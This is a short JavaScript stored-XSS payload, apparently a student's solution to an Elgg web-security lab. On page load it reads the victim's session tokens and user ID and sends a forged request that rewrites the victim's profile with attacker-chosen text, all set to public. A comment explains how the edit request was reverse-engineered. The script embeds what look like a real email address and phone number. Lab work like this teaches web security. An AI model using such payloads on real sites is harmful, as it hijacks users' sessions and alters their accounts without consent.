<script type="text/javascript">
	window.onload = function(){
		var guid = "&guid=" + elgg.session.user.guid;
		var ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;
		var token = "&__elgg_token="+elgg.security.token.__elgg_token;
		var name = "&name="+elgg.session.user.name;
		var desc = "&description=Samy has got you!" + "&accesslevel[description]=1";
		var sdesc ="&briefdescription=1605089"+"&accesslevel[briefdescription]=1";
		var loc = "&location=Dhaka"+ "&accesslevel[location]=1";
		var interest = "&interests=Dance"+"&accesslevel[interests]=1";
		var skill = "&skills=Web Development"+"&accesslevel[skills]=1";
		var email ="&contactemail=elizaan199834@gmail.com"+"&accesslevel[contactemail]=1";
		var phone ="&phone=96836"+ "&accesslevel[phone]=1";
		var mob = "&mobile=01915980030"+ "&accesslevel[mobile]=1";
		var web = "&website=https://moodle.cse.buet.ac.bd"+"&accesslevel[website]=1";
		var twitter ="&twitter=@elixir1234"+ "&accesslevel[twitter]=1";

		var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
		var content = token + ts + name + desc + sdesc+ loc +interest+ skill+ email+ phone + mob + web+ twitter+ guid;
		
		if(elgg.session.user.guid != elgg.page_owner.guid)
		{
			var Ajax = null;
			Ajax = new XMLHttpRequest();
			Ajax.open("POST",sendurl,true);
			Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
			Ajax.send(content);
		} 

		/* I have first changed the details page with every field given on the profile page. Then from
inspection, I have seen what is the URL for the post request to edit the profile. I have also
observed how the parameters are passed to edit the profile and what their serials are. Then I
have concatenated the parameters with ts, token, name, and guid according to the request
string and save them into the variable named content. Then made a js file to send such
requests with the proper sending URL that I found before. */
	}
</script>
